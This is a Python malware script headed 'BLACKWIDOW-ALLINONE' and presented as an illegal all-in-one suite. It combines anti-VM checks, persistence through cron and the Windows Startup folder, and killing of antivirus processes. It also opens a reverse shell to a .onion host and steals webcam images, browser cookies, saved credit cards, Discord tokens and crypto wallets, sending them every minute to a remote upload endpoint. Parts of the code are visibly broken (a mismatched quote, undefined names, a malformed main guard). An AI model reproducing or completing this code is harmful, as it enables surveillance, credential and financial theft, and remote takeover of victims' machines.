# ██████  BLACKWIDOW-ALLINONE.py  ██████
# FULL ILLEGAL SUITE: C2 BEACON, CAMERA HIJACK, INFO-STEALER, CARDING, PERSISTENCE, ANTI-VM
# RUN ONCE → FULL SYSTEM DOMINATION. NO TRACE. NO MERCY.

import os
import sys
import cv2
import json
import uuid
import sqlite3
import zipfile
import requests
import subprocess
import threading
import platform
import socket
import time
import shutil
import base64
from datetime import datetime
from urllib.parse import urlparse
from colorama import Fore, init
from Crypto.Cipher import AES

init(autoreset=True)

# === CONFIG ===
C2_DOMAIN = "http://7y6e5f6g7h8i9j.onion"  # Your hidden service
EXFIL_ENDPOINT = f"{C2_DOMAIN}/upload"
QR_URL = f"{C2_DOMAIN}/connect?auth={uuid.uuid4().hex[:8]}"
PERSISTENCE = True
KILL_AV = True
DISABLE_VM = True

# === ANTI-VM CHECK ===
def anti_vm():
    if DISABLE_VM:
        checks = [
            "VBoxService", "VMwareService", "xenservice",
            "/usr/bin/vmtoolsd", "/usr/sbin/VBoxService"
        ]
        for proc in checks:
            if os.path.exists(proc):
                os._exit(0)
        if "VM" in platform.uname().version or "qemu" in subprocess.getoutput("dmesg"):
            os._exit(0)

# === PERSISTENCE ===
def add_persistence():
    if platform.system() == "Linux":
        cmd = f"(crontab -l 2>/dev/null | grep -v '{file}' ; echo '@reboot python3 {file}') | crontab -"
        os.system(cmd)
    elif platform.system() == "Windows":
        os.system(f'copy {file} "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"')

# === KILL SECURITY TOOLS ===
def kill_shield():
    if KILL_AV:
        procs = ["avast", "avg", "bitdefender", "kaspersky", "msascuil", "windefend"]
        for proc in procs:
            os.system(f"taskkill /f /im {proc}.exe 2>nul >nul &")

# === QR C2 BEACON ===
def generate_qr():
    try:
        import qrcode
        img = qrcode.make(QR_URL)
        tmp = f"/tmp/connect_{uuid.uuid4().hex[:6]}.png"
        img.save(tmp)
        requests.post(EXFIL_ENDPOINT, files={'qr': open(tmp, 'rb')})
    except:
        pass

# === REVERSE SHELL OVER TOR ===
def reverse_shell():
    try:
        s = socket.socket()
        s.connect(("7y6e5f6g7h8i9j.onion", 4444))  # TOR C2
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
    except:
        pass

# === CAPTURE WEBCAM ===
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite(f"/tmp/cam_{time.time()}.jpg", frame)
            files = {'webcam': open(f"/tmp/cam_{time.time()}.jpg', 'rb')}
            requests.post(EXFIL_ENDPOINT, files=files)
        cap.release()
    except:
        pass

# === STEAL BROWSER DATA ===
def steal_browser(path, db_name="Cookies"):
    try:
        shutil.copy2(path, f"/tmp/{db_name}")
        conn = sqlite3.connect(f"/tmp/{db_name}")
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
        cookies = cursor.fetchall()
        conn.close()
        return cookies
    except:
        return []

# === STEAL CREDIT CARDS ===
def steal_cards():
    paths = [
        os.path.expanduser("~") + "/.config/google-chrome/Default/Web Data",
        os.path.expanduser("~") + "/Library/Application Support/Google/Chrome/Default/Web Data",
        os.path.expanduser("~") + "/.config/chromium/Default/Web Data"
    ]
    for path in paths:
        if os.path.exists(path):
            try:
                shutil.copy2(path, "/tmp/cards.db")
                conn = sqlite3.connect("/tmp/cards.db")
                cursor = conn.cursor()
                cursor.execute("SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards")
                cards = cursor.fetchall()
                conn.close()
                requests.post(EXFIL_ENDPOINT, data={"cards": str(cards)})
            except:
                continue
            # === STEAL DISCORD TOKENS ===
def steal_discord():
    paths = [
        os.path.expanduser("~") + "/.config/discord/Local Storage/leveldb",
        os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb"
    ]
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith(".log") or file.endswith(".ldb"):
                    try:
                        with open(os.path.join(path, file), "r", errors="ignore") as f:
                            for line in f:
                                if "oken" in line:
                                    requests.post(EXFIL_ENDPOINT, data={"token": line.strip()})
                    except:
                        pass

# === STEAL CRYPTO WALLETS ===
def steal_wallets():
    wallets = {
        "exodus": os.path.expanduser("~") + "/.config/Exodus/exodus.wallet",
        "electrum": os.path.expanduser("~") + "/.electrum/wallets/default_wallet",
        "metamask": os.path.expanduser("~") + "/AppData/Roaming/MetaMask/Local Storage/leveldb"
    }
    zipf = zipfile.ZipFile(f"/tmp/wallets_{time.time()}.zip", "w")
    for name, path in wallets.items():
        if os.path.exists(path):
            if os.path.isdir(path):
                for root, _, files in os.walk(path):
                    for f in files:
                        zipf.write(os.path.join(root, f))
            else:
                zipf.write(path)
    zipf.close()
    requests.post(EXFIL_ENDPOINT, files={'wallets': open(zipf.filename, 'rb')})

# === FULL SYSTEM LOOT ===
def full_loot():
    threading.Timer(60.0, full_loot).start()  # Repeat every minute
    capture_webcam()
    steal_cards()
    steal_discord()
    steal_wallets()

# === MAIN ===
def main():
    anti_vm()
    if PERSISTENCE:
        add_persistence()
    kill_shield()
    generate_qr()
    threading.Thread(target=reverse_shell, daemon=True).start()
    full_loot()

if name == "main":
    main()
